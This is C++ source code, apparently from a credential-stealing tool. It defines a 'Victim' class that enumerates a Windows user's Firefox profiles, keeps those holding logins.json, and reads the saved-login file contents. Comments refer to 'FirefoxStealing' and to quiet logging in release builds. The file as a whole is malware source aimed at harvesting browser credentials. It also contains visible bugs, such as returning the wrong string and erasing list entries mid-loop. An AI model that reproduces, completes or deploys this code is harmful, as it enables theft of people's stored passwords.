#include "Browsers.h"
#include "Victim.h"

/// GetFirefoxProfiles
/// <summary>
/// GetFirefoxProfiles is used to isolate the FirefoxStealing function from our Source.cpp file.
/// </summary>
/// <returns>Returns true if succeed else return false</returns>
bool Victim::GetFirefoxProfiles() {
	size_t dotIterator;
	bool containLogins = false;
	//Loop into profiles, for each profiles, call GetProfileContent. This function will Loop in every file/folder in the Firefox AppData Directory
	//C:\Users\{Username}\AppData\Roaming\Mozilla\Firefox\Profiles
	try {
		this->FirefoxProfileList = this->GetFirefoxProfilesList(this->p_FirefoxAppData);
		for (int i = 0; i < this->FirefoxProfileList.size(); i++) {
			this->FirefoxProfileList[i] = this->GetProfileContent(this->FirefoxProfileList[i]);
			for (std::wstring const& fileList : this->FirefoxProfileList[i].ProfileFiles) {
				//Check File Extensions **Not needed for now so commenting out**
				dotIterator = fileList.rfind('.', fileList.length());
				if (dotIterator != std::string::npos) {
					//std::wstring extension = fileList.substr(dotIterator + 1, fileList.length() - dotIterator);
					if (fileList == L"logins.json") {
						//everything good
						containLogins = true;
					}
				}
			}
			if (!containLogins) {
#ifdef _DEBUG
				std::wcout << L"Erasing profile : " << this->FirefoxProfileList[i].profileName << std::endl;
				std::wcout << L"Reason : DOES NOT CONTAIN ANY LOGINS INFORMATIONS" << std::endl;
#endif
				this->FirefoxProfileList.erase(this->FirefoxProfileList.begin() + i);
			}
		}
			for (int i = 0; i < this->FirefoxProfileList.size(); i++) {
#ifdef _DEBUG
				std::wcout << "Getting File Content of : " << this->FirefoxProfileList[i].profileName + L"\\logins.json" << std::endl;
#endif
				this->FirefoxProfileList[i].LoginsFileContent = this->GetProfileLoginsContent(this->FirefoxProfileList[i]);

			}
		}
	catch (std::logic_error& e) {
#ifdef _DEBUG
		std::wcout << "LOGIC_ERROR : " << e.what() << std::endl;
#else
		//Log to our temp log file.
#endif
		return false;
	}
	catch (std::runtime_error& e) {
#ifdef _DEBUG
		std::wcout << "RUNTIME_ERROR : " << e.what() << std::endl;
#else
		//Log to our temp log file.
#endif
		return false;
	}
	catch (std::exception& e) {
#ifdef _DEBUG
		std::wcout << "EXCEPTION : " << e.what() << std::endl;
#else
		//Log to our temp log file.
#endif
		return false;
	}
	catch (...) {
#ifdef _DEBUG
		std::wcout << "SOMETHING ODD HAPPENED HERE EXITING THE PROGRAM !" << std::endl;
#else
		//Log to our temp log file.
#endif
		return false;
	}
	return true;
}

/// GetFirefoxProfilesList
/// <summary>
/// Get FirefoxProfilesList loop into the C:\Users\{Username}\AppData\Roaming\Mozilla\Firefox\Profiles
/// </summary>
/// <param name="p_firefox">p_firefox correspond to the path of Firefox profiles on the current system.</param>
/// <returns>The functions returns a list of profiles</returns>
std::vector<Profile> Browsers::GetFirefoxProfilesList(const std::wstring& p_firefox) {
	std::vector<Profile> profileList;
	std::wstring directory = p_firefox + L"\\*";;
	if (p_firefox.length() > 1) {
		DWORD fileAttribute = GetFileAttributesW(p_firefox.c_str());
		if (fileAttribute != INVALID_FILE_ATTRIBUTES && (fileAttribute & FILE_ATTRIBUTE_DIRECTORY)) {
			WIN32_FIND_DATAW ffd;
			HANDLE hFind = FindFirstFileW(directory.c_str(), &ffd);
			do {
				//Dynamically allocated Profile* that is used to push_back our profileList.
				Profile* dummyProfile = new Profile;
				std::wstring f = ffd.cFileName;
				if (std::wcscmp(ffd.cFileName, L".") != 0 &&
					std::wcscmp(ffd.cFileName, L"..") != 0) {
					if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
						dummyProfile->profileName = ffd.cFileName;
						dummyProfile->profilePath = p_firefox + L"\\" + ffd.cFileName;
						profileList.push_back(*dummyProfile);
						delete dummyProfile;
						//dirs.directories.push_back(p_FirefoxAppData + L"\\" + ffd.cFileName);
#ifdef _DEBUG
						std::wcout << p_firefox << L"\\" << ffd.cFileName << std::endl;
#endif
					}
				}

			} while (FindNextFileW(hFind, &ffd) != 0);
		}
	}
	return profileList;
}

/// GetProfileContent
/// <summary>
/// GetProfileContent takes a profile obtained using the GetFirefoxProfilesList function. It loops on the given
/// profile directory and check all the files. If a file ends with .json and starts with logins (logins.json)
/// Then the profile is kept else the profile will be discarded
/// </summary>
/// <param name="firefoxProfiles">A Firefox Profile</param>
/// <returns>A Firefox Profile</returns>
Profile Browsers::GetProfileContent(Profile firefoxProfiles) {
	WIN32_FIND_DATAW ffd;
	if (firefoxProfiles.profilePath.empty() || firefoxProfiles.profilePath.length() < 50) throw std::exception{ "Firefox path looks wrong !" };
	else {
		DWORD fileAttribute = GetFileAttributesW(firefoxProfiles.profilePath.c_str());
		if (fileAttribute != INVALID_FILE_ATTRIBUTES && (fileAttribute & FILE_ATTRIBUTE_DIRECTORY)) { //Check that our path is a dir
			std::wstring firstFile = firefoxProfiles.profilePath + L"\\*";
			HANDLE hFind = FindFirstFileW(firstFile.c_str(), &ffd);
			do {
				std::wstring f = ffd.cFileName;
				if (std::wcscmp(ffd.cFileName, L".") != 0 &&
					std::wcscmp(ffd.cFileName, L"..") != 0) {
					if (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
						//If file is a directory add it to the directories param
						firefoxProfiles.ProfileDirectories.push_back((wchar_t*)ffd.cFileName);
#ifdef _DEBUG
						std::wcout << L"PATH : " << ffd.cFileName << std::endl;
#endif
					}
					else {
#ifdef _DEBUG
						std::wcout << L"FILE : " << ffd.cFileName << std::endl;
#endif
						firefoxProfiles.ProfileFiles.push_back(ffd.cFileName);
					}

				}
			} while (FindNextFileW(hFind, &ffd) != 0);
		}
	}
	return firefoxProfiles;
}

std::string Browsers::GetProfileLoginsContent(Profile& profileName) {
	std::string profileContent = "";
	std::string r_ProfileContent = "";
	std::ifstream loginsProfileFile(profileName.profilePath + L"\\logins.json");
	while (std::getline(loginsProfileFile, profileContent)) {
		if (profileContent.empty()) continue;
		r_ProfileContent.append(profileContent + "\n");
	}
	std::cout << profileContent << std::endl;
	return profileContent;
}